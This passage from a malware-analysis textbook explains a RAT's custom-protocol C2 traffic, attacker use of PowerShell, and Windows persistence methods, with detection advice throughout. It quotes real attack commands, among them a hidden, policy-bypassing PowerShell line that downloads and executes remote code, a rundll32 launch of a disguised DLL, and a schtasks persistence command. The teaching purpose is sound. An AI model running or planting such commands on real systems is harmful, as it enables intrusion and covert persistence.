+<p class="calibre2">Adversaries may use a custom protocol or communicate over the non-standard port to hide their command and control traffic. The following is an example of such a malware sample (<em class="calibre17">HEARTBEAT RAT</em>) whose details are documented in the whitepaper (<a href="http://www.trendmicro.it/media/wp/the-heartbeat-apt-campaign-whitepaper-en.pdf" class="calibre10">http://www.trendmicro.it/media/wp/the-heartbeat-apt-campaign-whitepaper-en.pdf</a>). This malware makes an encrypted communication on port <kbd class="calibre13">80</kbd> using a custom protocol (not HTTP) and retrieves the command from the C2 server. It makes use of the <kbd class="calibre13">Socket()</kbd>, <kbd class="calibre13">Connect()</kbd>, <kbd class="calibre13">Send()</kbd>, and <kbd class="calibre13">Recv()</kbd> API calls to communicate and receive commands from the C2:</p>
+<ol class="calibre14">
+<li class="calibre12" value="1">First, the malware calls the <kbd class="calibre13">WSAStartup()</kbd> API to initialize the Windows socket system. It then calls the <kbd class="calibre13">Socket()</kbd> API to create a socket, which is shown in the following screenshot. The socket API accepts three arguments. The first argument, <kbd class="calibre13"><span>AF_INET</span></kbd>, specifies the address family, which is <kbd class="calibre13">IPV4</kbd>. The second argument is the socket type, <kbd class="calibre13">(SOCK_STREAM)</kbd>, and the third argument, <kbd class="calibre13"><span>IPPROTO_TCP</span></kbd>, specifies the protocol being used (TCP, in this case):</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00204.jpeg" class="calibre41"/></div>
+<ol start="2" class="calibre14">
+<li class="calibre12" value="2">Before establishing the connection to the socket, the malware resolves the address of the C2 domain name using the <kbd class="calibre13">GetHostByName()</kbd> API. This makes sense, because the <em class="calibre19">remote address</em> and <em class="calibre19">port</em> need to be supplied to the <kbd class="calibre13">Connect()</kbd> API to establish the connection. The return value (<kbd class="calibre13">EAX</kbd>) of <kbd class="calibre13">GetHostByName()</kbd> is a pointer to a structure named <kbd class="calibre13">hostent</kbd>, which contains the resolved IP addresses:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00205.jpeg" class="calibre189"/></div>
+<ol start="3" class="calibre14">
+<li class="calibre12" value="3">It reads the resolved IP address from the <kbd class="calibre13">hostent</kbd> structure and passes it to the <kbd class="calibre13">inet_ntoa()</kbd> API, which converts the IP address into an ASCII string such as <kbd class="calibre13">192.168.1.100</kbd>. It then calls <kbd class="calibre13">inet_addr()</kbd>, which converts an IP address string such as <kbd class="calibre13">192.168.1.100</kbd> so that it can be used by the <kbd class="calibre13">Connect()</kbd> API. The <kbd class="calibre13">Connect()</kbd> API is then called to establish the connection with the socket:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00206.jpeg" class="calibre41"/></div>
+<ol start="4" class="calibre14">
+<li class="calibre12" value="4">The malware then collects the <em class="calibre19">system information</em>, encrypts it using the <kbd class="calibre13">XOR</kbd> encryption algorithm (encryption techniques will be covered in <em class="calibre19">Chapter 9</em>), and sends it to C2 using the <kbd class="calibre13">Send()</kbd> API call. The second argument to the <kbd class="calibre13">Send()</kbd> API shows the encrypted content that will be sent to the C2 server:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00207.jpeg" class="calibre41"/></div>
+<p class="calibre26">The following screenshot shows the encrypted network traffic captured after calling the <kbd class="calibre13">Send()</kbd> API:</p>
+<div class="cdpaligncenter"><img src="../images/00208.jpeg" class="calibre41"/></div>
+<ol start="5" class="calibre14">
+<li class="calibre12" value="5">The malware then calls <kbd class="calibre13">CreateThread()</kbd> to start a new thread. The third parameter to <kbd class="calibre13">CreateThread</kbd> specifies the start address (start function) of the thread, so after the call to <kbd class="calibre13">CreateThread()</kbd>, the execution begins at the start address. In this case, the start address of the thread is a function that is responsible for reading the content from the C2:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00209.jpeg" class="calibre41"/></div>
+<p class="calibre2">The content from the C2 is retrieved using the <kbd class="calibre13">Recv()</kbd> API function. The second argument to <kbd class="calibre13">Recv()</kbd> is a buffer where the retrieved content is stored. The retrieved content is then decrypted, and, depending on the command received from the C2, appropriate actions are performed by the malware. To understand all the functionalities of this malware and how it processes the received data, refer to the author's presentation and the video demo (<a href="https://cysinfo.com/session-11-part-2-dissecting-the-heartbeat-apt-rat-features/" class="calibre10">https://cysinfo.com/session-11-part-2-dissecting-the-heartbeat-apt-rat-features/</a>):</p>
+<div class="cdpaligncenter"><img src="../images/00210.jpeg" class="calibre41"/></div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.6 PowerShell-Based Execution</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">To evade detection, malware authors often leverage tools that already exist on the system (such as <em class="calibre17">PowerShell</em>) which allow them to hide their malicious activities. PowerShell is a management engine based on the .NET framework. This engine exposes a series of commands called <em class="calibre17">cmdlets</em>. The engine is hosted in an application and Windows operating system, which by default ships a <em class="calibre17">command-line interface (interactive console)</em> and a <em class="calibre17">GUI PowerShell ISE (Integrated Scripted Environment).</em></p>
+<p class="calibre2">PowerShell is not a programming language, but it allows you to create useful scripts containing multiple commands. You can also open <em class="calibre17">PowerShell prompt</em> and execute individual commands. PowerShell is typically used by the System Administrators for a legitimate purpose. However, there is an increase in the use of PowerShell by the attackers to execute their malicious code. The major reason why attackers use PowerShell is that it provides access to all major operating system functions and it leaves very few traces, thereby making detection more difficult. The following outlines how attackers leverage PowerShell in malware attacks:</p>
+<ul class="calibre11">
+<li class="calibre12">In most cases, Powershell is used post-exploitation to download additional components. It is mostly delivered via email attachments containing files (such as <kbd class="calibre13">.lnk</kbd>, <kbd class="calibre13">.wsf</kbd>, JavaScript, VBScript, or office documents containing malicious macros) which are capable of executing PowerShell scripts directly or indirectly. Once the attacker tricks the user into opening the malicious attachment, then the malicious code invokes PowerShell directly or indirectly to download additional components.</li>
+<li class="calibre12">It is used in the lateral movement, where the attacker executes code on a remote computer to spread inside the network.</li>
+<li class="calibre12">Attackers use PowerShell to dynamically load and execute code directly from memory without accessing the file system. This allows the attacker to be stealthy and makes forensic analysis much harder.</li>
+<li class="calibre12">Attackers use PowerShell to execute their obfuscated code; this makes it hard to detect it with traditional security tools.</li>
+</ul>
+<div class="packt_tip">If you are new to PowerShell, you can find many tutorials to get started with PowerShell at the following link: <a href="https://social.technet.microsoft.com/wiki/contents/articles/4307.powershell-for-beginners.aspx" class="calibre20">https://social.technet.microsoft.com/wiki/contents/articles/4307.powershell-for-beginners.aspx</a></div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.6.1 PowerShell Command Basics</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">Before delving into the details of how malware uses PowerShell, let's understand how to execute PowerShell commands. You can execute a PowerShell command using the interactive PowerShell console; you can bring it up using the Windows program search feature or by typing <kbd class="calibre13">powershell.exe</kbd> in the command prompt. Once in the interactive PowerShell, you can type the command to execute it. In the following example, the <kbd class="calibre13">Write-Host</kbd> cmdlet writes the message to the console. A <em class="calibre17">cmdlet</em> (such as <kbd class="calibre13">Write-Host</kbd>) is a compiled command written in a .NET Framework language which is meant to be small and serves a single purpose. The <em class="calibre17">cmdlet</em> follows a standard <em class="calibre17">Verb-Noun</em> naming convention:</p>
+<pre class="calibre18">PS C:\&gt; <strong class="calibre1">Write-Host "Hello world"</strong><br class="title-page-name"/>Hello world</pre>
+<p class="calibre2">A cmdlet can accept parameters. The parameter starts with a dash immediately followed by a parameter name and a space followed by the parameter value. In the following example, the <kbd class="calibre13">Get-Process</kbd> cmdlet is used to display the information about the explorer process. The <kbd class="calibre13">Get-Process</kbd> cmdlet accepts a parameter whose name is <kbd class="calibre13">Name</kbd>, and the value is <kbd class="calibre13">explorer</kbd>:</p>
+<pre class="calibre18">PS C:\&gt; <strong class="calibre1">Get-Process -Name explorer</strong><br class="title-page-name"/>Handles NPM(K) PM(K)  WS(K)  VM(M)  CPU(s) Id  ProcessName<br class="title-page-name"/>------- ------ -----  -----  ----- ------  --  -----------<br class="title-page-name"/>1613       86  36868  77380  ...35  10.00  3036 explorer</pre>
+<p class="calibre2">Alternatively, you can also use parameter shortcuts to reduce some typing; the above command can also be written as:</p>
+<pre class="calibre18">PS C:\&gt; <strong class="calibre1">Get-Process -n explorer</strong><br class="title-page-name"/>Handles NPM(K) PM(K) WS(K)  VM(M)  CPU(s) Id  ProcessName<br class="title-page-name"/>------- ------ ----- -----  -----  -----  --  -----------<br class="title-page-name"/>1629       87 36664  78504  ...40  10.14  3036 explorer</pre>
+<p class="calibre2">To get more information about cmdlet (such as details about the syntax and the parameters), you can use the <kbd class="calibre13">Get-Help</kbd> cmdlet or the <kbd class="calibre13">help</kbd> command. If you wish to get the most up-to-date information, you can get help online, using the second command shown here:</p>
+<pre class="calibre18">PS C:\&gt; <strong class="calibre1">Get-Help Get-Process</strong><br class="title-page-name"/>PS C:\&gt; <strong class="calibre1">help Get-Process -online</strong></pre>
+<p class="calibre2">In PowerShell, variables can be used to store values. In the following example, <kbd class="calibre13">hello</kbd> is a variable that is prefixed with a <kbd class="calibre13">$</kbd> symbol:</p>
+<pre class="calibre18">PS C:\&gt; <strong class="calibre1">$hello = "Hello World"</strong><br class="title-page-name"/>PS C:\&gt; <strong class="calibre1">Write-Host $hello</strong><br class="title-page-name"/>Hello World</pre>
+<p class="calibre2">Variables can also hold the result of PowerShell commands, and the variable can then be used in the place of a command, as follows:</p>
+<pre class="calibre18">PS C:\&gt; <strong class="calibre1">$processes = Get-Process</strong><br class="title-page-name"/>PS C:\&gt; <strong class="calibre1">$processes | where-object {$_.ProcessName -eq 'explorer'}</strong><br class="title-page-name"/>Handles NPM(K) PM(K) WS(K) VM(M) CPU(s) Id  ProcessName<br class="title-page-name"/>------- ------ ----- ----- ----- ------ --  -----------<br class="title-page-name"/>1623        87 36708 78324 ...36 10.38  3036 explorer</pre>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.6.2 PowerShell Scripts And Execution Policy</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">PowerShell's capabilities allow you to create scripts by combining multiple commands. The PowerShell script has an extension of <kbd class="calibre13">.ps1</kbd><em class="calibre17">.</em> By default, you will not be allowed to execute a PowerShell script. This is due to the default <em class="calibre17">execution policy</em> setting in PowerShell that prevents the execution of PowerShell scripts. The execution policy determines the conditions under which PowerShell scripts are executed. By default, the execution policy is set to <em class="calibre17">"Restricted",</em> which means that a PowerShell script (.ps1) cannot be executed, but you can still execute individual commands. For example, when the <kbd class="calibre13">Write-Host</kbd> <kbd class="calibre13">"Hello World"</kbd> command is saved as a PowerShell script <em class="calibre17">(hello.ps1)</em> and executed, you get the following message stating that running scripts is disabled. This is due to the execution policy setting:</p>
+<pre class="calibre18">PS C:\&gt; <strong class="calibre1">.\hello.ps1</strong><br class="title-page-name"/>.\hello.ps1 : File C:\hello.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.<br class="title-page-name"/>At line:1 char:1<br class="title-page-name"/>+ .\hello.ps1<br class="title-page-name"/>+ ~~~~~~~~~~~<br class="title-page-name"/>+ CategoryInfo : SecurityError: (:) [], PSSecurityException<br class="title-page-name"/>+ FullyQualifiedErrorId : UnauthorizedAccess</pre>
+<p class="calibre2">The execution policy is not a security feature; it's just a control to prevent users from accidentally executing scripts. To display the current execution policy setting, you can use the following command:</p>
+<pre class="calibre18">PS C:\&gt; <strong class="calibre1">Get-ExecutionPolicy</strong><br class="title-page-name"/>Restricted</pre>
+<p class="calibre2">You can change the execution policy setting using the <kbd class="calibre13">Set-ExecutionPolicy</kbd> command (provided you are executing the command as Administrator). In the following example, the execution policy is set to <kbd class="calibre13">Bypass</kbd>, which allows the script to run without any restriction. This setting can be useful for your analysis if you come across a malicious PowerShell script and if you would like to execute it to determine its behavior:</p>
+<pre class="calibre18">PS C:\&gt; <strong class="calibre1">Set-ExecutionPolicy Bypass</strong><br class="title-page-name"/>PS C:\&gt; <strong class="calibre1">.\hello.ps1</strong><br class="title-page-name"/>Hello World</pre>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.6.2 Analyzing PowerShell Commands/Scripts</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">Powershell commands are easy to understand compared to assembly code, but in some situations (such as when a PowerShell command is obfuscated), you may want to run the PowerShell commands to understand how it works. The easiest method to test a single command is to execute it in the interactive PowerShell. If you wish to execute a PowerShell script (<kbd class="calibre13">.ps1</kbd>) containing multiple commands, first change the execution policy setting to either <em class="calibre17">Bypass</em> or <em class="calibre17">Unrestricted</em> (as mentioned previously) and then execute the script using the PowerShell console. Remember to execute malicious script in an isolated environment.</p>
+<p class="calibre2">Running the script (<kbd class="calibre13">.ps1</kbd>) in the PowerShell prompt will run all the commands at once. If you wish to have control over the execution, then you can debug the PowerShell script using <em class="calibre17">PowerShell ISE (Integrated Scripting Environment)</em>. You can bring up PowerShell ISE by using the program search feature and then load the PowerShell script into PowerShell ISE or copy-paste a command and use its debugging features (such as <em class="calibre17">Step Into</em>, <em class="calibre17">Step Over</em>, <em class="calibre17">Step Out,</em> and B<em class="calibre17">reakpoints</em>) which can be accessed via the <span class="calibre7">Debug</span> menu. Before debugging, make sure to set the execution policy to <em class="calibre17">Bypass</em>:</p>
+<div class="cdpaligncenter"><img src="../images/00211.jpeg" class="calibre190"/></div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.6.3 How Attackers Use PowerShell</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">With an understanding of basic PowerShell and what tools to use for analysis, let's now look at how attackers use PowerShell. Due to the restriction in executing the PowerShell scripts <span class="calibre7">(<kbd class="calibre13">.ps1</kbd>)</span> via the PowerShell console or by double-clicking (which will open it in notepad rather than executing the script), it is unlikely to see adversaries sending PowerShell scripts to their victims directly. The attacker must first trick the user into executing the malicious code; this is mostly done by sending email attachments containing files such as <kbd class="calibre13">.lnk</kbd><em class="calibre17">,</em> <kbd class="calibre13">.wsf</kbd><em class="calibre17">, javascript,</em> or <em class="calibre17">malicious macro documents</em>. Once the user is tricked into opening the attached files, the malicious code can then invoke PowerShell directly (<kbd class="calibre13">powershell.exe</kbd>), or indirectly via <kbd class="calibre13">cmd.exe</kbd>, <kbd class="calibre13">Wscript</kbd>, <kbd class="calibre13">Cscript</kbd>, and so on. After the PowerShell is invoked, various methods can be used to bypass the execution policy. For example, to bypass an execution restriction policy, an attacker can use the malicious code to invoke <kbd class="calibre13">powershell.exe</kbd> and pass the <kbd class="calibre13">Bypass</kbd> execution policy flag, as shown in the following screenshot. This technique will work even if the user is not an Administrator, and it overrides the default execution restriction policy and executes the script:</p>
+<div class="cdpaligncenter"><img src="../images/00212.jpeg" class="calibre41"/></div>
+<p class="calibre2">In the same manner, attackers use various PowerShell command-line arguments to bypass the execution policy. The following table outlines the most common PowerShell arguments used to evade detection and bypass local restrictions:</p>
+<table border="1" class="calibre46">
+<tbody class="calibre47">
+<tr class="calibre48">
+<td class="calibre49"><strong class="calibre1"><span>Command-Line Argument</span></strong></td>
+<td class="calibre49"><strong class="calibre1">Description</strong></td>
+</tr>
+<tr class="calibre48">
+<td class="calibre49">ExecutionPolicy Bypass (<kbd class="calibre13">-Exec bypass</kbd>)</td>
+<td class="calibre49">Ignores the execution policy restriction and runs script without warning</td>
+</tr>
+<tr class="calibre48">
+<td class="calibre49">WindowStyle Hidden (<kbd class="calibre13">-W Hidden</kbd>)</td>
+<td class="calibre49">Hides the PowerShell window</td>
+</tr>
+<tr class="calibre48">
+<td class="calibre49">NoProfile (<kbd class="calibre13">-NoP</kbd>)</td>
+<td class="calibre49">Ignores the commands in the profile file</td>
+</tr>
+<tr class="calibre48">
+<td class="calibre49">EncodedCommand (<kbd class="calibre13">-Enc</kbd>)</td>
+<td class="calibre49">Executes command encoded in Base64</td>
+</tr>
+<tr class="calibre48">
+<td class="calibre49">NonInteractive (<kbd class="calibre13">-NonI</kbd>)</td>
+<td class="calibre49">Does not present an interactive prompt to the user</td>
+</tr>
+<tr class="calibre48">
+<td class="calibre49">Command (<kbd class="calibre13">-C</kbd>)</td>
+<td class="calibre49">Executes a single command</td>
+</tr>
+<tr class="calibre48">
+<td class="calibre49">File (<kbd class="calibre13">-F</kbd>)</td>
+<td class="calibre49">Executes commands from a given file</td>
+</tr>
+</tbody>
+</table>
+<p class="calibre2">Apart from using PowerShell command-line arguments, attackers also make use of cmdlets or .NET APIs in the PowerShell scripts. The following are the most frequently used commands and functions:</p>
+<ul class="calibre11">
+<li class="calibre12"><kbd class="calibre13">Invoke-Expression (IEX)</kbd>: This cmdlet evaluates or executes a specified string as a command</li>
+<li class="calibre12"><kbd class="calibre13">Invoke-Command</kbd>: This cmdlet can execute a PowerShell command on either a local or a remote computer</li>
+<li class="calibre12"><kbd class="calibre13">Start-Process</kbd>: This cmdlet starts a process from a given file path</li>
+<li class="calibre12"><kbd class="calibre13">DownloadString</kbd>: This method from <kbd class="calibre13">System.Net.WebClient</kbd> (WebClient Class) downloads the resource from an URL as a string</li>
+<li class="calibre12"><kbd class="calibre13">DownloadFile()</kbd>: This method from <kbd class="calibre13">System.Net.WebClient</kbd> (WebClient Class) downloads the resource from an URL to a local file</li>
+</ul>
+<p class="calibre2">The following is an example of a PowerShell downloader used in an attack mentioned in the author's blog post (<a href="https://cysinfo.com/cyber-attack-targeting-indian-navys-submarine-warship-manufacturer/" class="calibre10">https://cysinfo.com/cyber-attack-targeting-indian-navys-submarine-warship-manufacturer/</a>). In this case, the PowerShell command was invoked via <kbd class="calibre13">cmd.exe</kbd> by the malicious macro contained within the Microsoft Excel sheet, which was sent in an email attachment to the victims.<br class="calibre6"/>
+The PowerShell drops the downloaded executable in the <kbd class="calibre13">%TEMP%</kbd> directory as <kbd class="calibre13">doc6.exe</kbd>. It then adds a registry entry for the dropped executable and invokes <kbd class="calibre13">eventvwr.exe</kbd>, which is an interesting registry hijack technique which allows <kbd class="calibre13">doc6.exe</kbd> to be executed by <kbd class="calibre13">eventvwr.exe</kbd> with high integrity level. This technique also silently bypasses the <em class="calibre17">UAC (user account control)</em>:</p>
+<div class="cdpaligncenter"><img src="../images/00213.jpeg" class="calibre41"/></div>
+<p class="calibre2">The following is a PowerShell command from a targeted attack (<a href="https://cysinfo.com/uri-terror-attack-spear-phishing-emails-targeting-indian-embassies-and-indian-mea/" class="calibre10">https://cysinfo.com/uri-terror-attack-spear-phishing-emails-targeting-indian-embassies-and-indian-mea/</a>). In this case, the PowerShell is invoked by the malicious macro and instead of downloading an executable directly, the base64 content from a Pastebin link was downloaded using the <kbd class="calibre13">DownloadString</kbd> method. After downloading the encoded content, it is decoded and dropped onto the disk:</p>
+<pre class="calibre18">powershell -w hidden -ep bypass -nop -c "IEX ((New-Object Net.WebClient).DownloadString('http://pastebin.com/raw/[removed]'))"</pre>
+<p class="calibre2">In the following example, before invoking PowerShell, a malware dropper first writes a DLL with a <em class="calibre17">.bmp</em> extension (<kbd class="calibre13">heiqh.bmp</kbd>) in the <kbd class="calibre13">%Temp%</kbd> directory and then launches <kbd class="calibre13">rundll32.exe</kbd> via PowerShell to load the DLL and executes the DLL's export function <kbd class="calibre13">dlgProc</kbd>:</p>
+<pre class="calibre18">PowerShell cd $env:TEMP ;start-process rundll32.exe heiqh.bmp,dlgProc</pre>
+<div class="packt_infobox">For more information on different PowerShell techniques used in malware attacks, refer to the Whitepaper: <em class="calibre22">The Increased use of PowerShell in attacks:</em> <a href="https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf" class="calibre20">https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf</a>. <span class="calibre21">Adversaries make use of various obfuscation techniques to make analysis harder. To get an idea of how attackers use PowerShell obfuscation, watch this Derbycon presentation by Daniel Bohannon: </span><a href="https://www.youtube.com/watch?v=P1lkflnWb0I" class="calibre20">https://www.youtube.com/watch?v=P1lkflnWb0I</a>.</div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">2. Malware Persistence Methods</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">Often, adversaries want their malicious program to stay on the compromised computers, even when the Windows restarts. This is achieved using various persistence methods; this persistence allows an attacker to remain on the compromised system without having to re-infect it. There are many ways to run the malicious code each time Windows starts. In this section, you will understand some of the persistence methods used by the adversaries. Some of these persistence techniques covered in this section allow the attackers to execute malicious code with elevated privileges (privilege escalation).</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">2.1 Running the Registry Key</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">One of the most common persistence mechanisms used by adversaries to survive the reboot is achieved by adding an entry to the <em class="calibre17">run registry keys</em>. The program that is added to the run registry key gets executed at system startup. The following is a list of the most commonly run registry keys. Malware can add itself to various auto-start locations in addition to the ones were are about to mention. The best way to get an idea of various auto-start locations is to use the <em class="calibre17">AutoRuns utility </em><span class="calibre7">by Sysinternals</span> (<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns" class="calibre10">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a>):</p>
+<pre class="calibre18">HKCU\Software\Microsoft\Windows\CurrentVersion\Run<br class="title-page-name"/>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br class="title-page-name"/>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<br class="title-page-name"/>HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce<br class="title-page-name"/>HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run<br class="title-page-name"/>HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</pre>
+<p class="calibre2">In the following example, upon execution, the malware (<kbd class="calibre13">bas.exe</kbd>)  first drops an executable in the Windows directory <em class="calibre17">(</em><kbd class="calibre13">LSPRN.EXE</kbd><em class="calibre17">)</em> and then adds the following entry in the run registry key so that the malicious program can start every time the system starts. From the registry entries, it can be seen that malware is trying to make its binary look like a printer-related application:</p>
+<pre class="calibre18"><strong class="calibre1">[RegSetValue]</strong> <strong class="calibre1">bas.exe</strong>:2192 &gt; HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\<strong class="calibre1">Run\PrinterSecurityLayer = C:\Windows\LSPRN.EXE</strong></pre>
+<p class="calibre2">To detect the malware using this persistence method, you can monitor for the changes to the Run registry keys that are not associated with the known program. You can also use Sysinternal's <em class="calibre17">AutoRuns utility</em> to inspect the Auto-start locations for suspicious entries.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">2.2 Scheduled Tasks</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">Another persistence method adversaries use is to schedule a task that allows them to execute their malicious program at a specified time or during system startup. Windows utilities such as <kbd class="calibre13">schtasks</kbd> and <kbd class="calibre13">at</kbd> are normally used by the adversaries to schedule a program or script to execute at a desired date and time. By making use of these utilities, an attacker can create tasks on a local computer or remote computer, provided the account used to create the task is part of an Administrator group. In the following example, the malware (<kbd class="calibre13">ssub.exe</kbd>) first creates a file called <kbd class="calibre13">service.exe</kbd> in the <kbd class="calibre13">%AllUsersProfile%\WindowsTask\</kbd> directory and then invokes <kbd class="calibre13">cmd.exe</kbd>,  which in turn uses the <kbd class="calibre13">schtasks</kbd> Windows utility to create a scheduled task for persistence:</p>
+<pre class="calibre18"><strong class="calibre1">[CreateFile]</strong> <strong class="calibre1">ssub.exe</strong>:3652 &gt; <strong class="calibre1">%AllUsersProfile%\WindowsTask\service.exe</strong><br class="title-page-name"/><strong class="calibre1">[CreateProcess]</strong> <strong class="calibre1">ssub.exe</strong>:3652 &gt; "%WinDir%\System32\<strong class="calibre1">cmd.exe /C</strong> <strong class="calibre1">schtasks</strong> /create /tn MyApp /tr %AllUsersProfile%\WindowsTask\service.exe /sc ONSTART /f"<br class="title-page-name"/><strong class="calibre1">[CreateProcess] cmd.exe:3632 &gt; "schtasks /create /tn MyApp /tr %AllUsersProfile%\WindowsTask\service.exe /sc ONSTART /f</strong></pre>
+<p class="calibre2">To detect this type of persistence, one can use the Sysinternals <em class="calibre17">Autoruns or</em> the <em class="calibre17">task scheduler</em> utility to list currently scheduled tasks. You should consider monitoring the changes to the tasks that are not related to the legitimate programs. You can also monitor the command-line arguments passed to the system utilities such as <kbd class="calibre13">cmd.exe</kbd>, which may be used to create tasks. Tasks may also be created using management tools such as <em class="calibre17">PowerShell</em> and <em class="calibre17">Windows Management Instrumentation (WMI)</em>, so appropriate logging and monitoring should help in detecting this technique.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">2.3 Startup Folder</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">Adversaries can achieve persistence by adding their malicious binary in the <em class="calibre17">startup folders</em>. When the operating system starts, the startup folder is looked up and files residing in this folder are executed. The Windows operating system maintains two types of startup folders: <em class="calibre17">(a) user wide</em> and <em class="calibre17">(b) system-wide</em>, as shown in the following code. A program residing in the user's startup folder is executed only for a specific user and the program residing in the system folder is executed when any user logs on to the system. Administrator privilege is required to achieve persistence using a system-wide startup folder:</p>
+<pre class="calibre18">C:\%AppData%\Microsoft\Windows\Start Menu\Programs\Startup<br class="title-page-name"/>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</pre>
+<p class="calibre2">In the following example, the malware <em class="calibre17">(Backdoor.Nitol)</em> first drops a file in the <kbd class="calibre13">%AppData%</kbd> directory. It then creates a shortcut <em class="calibre17">(</em><kbd class="calibre13">.lnk</kbd><em class="calibre17">)</em> that points to the dropped file and then adds that shortcut to the <kbd class="calibre13">Startup</kbd> folder. This way, when the system starts, the dropped file gets executed via the shortcut <em class="calibre17">(</em><kbd class="calibre13">.lnk</kbd><em class="calibre17">)</em> file:</p>
+<pre class="calibre18">[<strong class="calibre1">CreateFile</strong>] <strong class="calibre1">bllb.exe</strong>:3364 &gt; <strong class="calibre1">%AppData%\Abcdef Hijklmno Qrs\Abcdef Hijklmno Qrs.exe</strong><br class="title-page-name"/>[<strong class="calibre1">CreateFile</strong>] <strong class="calibre1">bllb.exe</strong>:3364 &gt; <strong class="calibre1">%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\Abcdef Hijklmno Qrs.exe.lnk</strong></pre>
+<p class="calibre2">To detect this type of attack, you can monitor the entries added and changes made to the startup folders.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">2.4 Winlogon Registry Entries</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">An attacker can achieve persistence by modifying the registry entries used by the <em class="calibre17">Winlogon</em> process. The Winlogon process is responsible for handling interactive <em class="calibre17">user logons</em> and <em class="calibre17">logoffs</em>. Once the user is authenticated, the <kbd class="calibre13">winlogon.exe</kbd> process launches <kbd class="calibre13">userinit.exe</kbd>, which runs logon scripts and re-establishes network connections. <kbd class="calibre13">userinit.exe</kbd> then starts <kbd class="calibre13">explorer.exe</kbd>, which is the default User's shell.</p>
+<p class="calibre2">The <kbd class="calibre13">winlogon.exe</kbd> process launches <kbd class="calibre13">userinit.exe</kbd> due to the following registry value. This entry specifies which programs need to be executed by Winlogon when a user logs on. By default, this value is set to the path of <kbd class="calibre13">userinit.exe</kbd> (<kbd class="calibre13">C:\Windows\system32\userinit.exe</kbd>). An attacker can change or add another value containing the path to the malicious executable, which will then be launched by the <kbd class="calibre13">winlogon.exe</kbd> process (when the user logs on):</p>
+<pre class="calibre18">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</pre>
+<p class="calibre2">In the same manner, <kbd class="calibre13">userinit.exe</kbd> consults the following registry value to start the default User's shell. By default, this value is set to <kbd class="calibre13">explorer.exe</kbd>. An attacker can change or add another entry containing the name of the malicious executable, which will then be started by <kbd class="calibre13">userinit.exe</kbd>:</p>
+<pre class="calibre18">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</pre>
+<p class="calibre2">In the following example, the <em class="calibre17">Brontok</em> worm achieves persistence by modifying the following Winlogon registry values with its malicious executables:</p>
+<div class="cdpaligncenter"><img src="../images/00214.jpeg" class="calibre41"/></div>
+<p class="calibre2">To detect this type of persistence mechanism, the Sysinternals <em class="calibre17">Autoruns utility</em> may be used. You can monitor for suspicious entries (not related to legitimate programs) in the registry, as mentioned earlier.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">2.5 Image File Execution Options</h1>
+                
+            
+            <article>
+                
+<p class="calibre2"><em class="calibre17">Image File Execution Options (IFEO)</em> allows one to launch an executable directly under the debugger. It gives the developer the option to debug their software to investigate issues in the executable's startup code. A developer can create a subkey with the name of his/her executable under the following registry key and set the debugger value to the path of the debugger:</p>
+<pre class="calibre18"><strong class="calibre1">Key:</strong> "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<strong class="calibre1">&lt;executable name&gt;</strong>"<br class="title-page-name"/><strong class="calibre1">Value:</strong> <strong class="calibre1">Debugger</strong> : REG_SZ : <strong class="calibre1">&lt;full-path to the debugger&gt;</strong></pre>
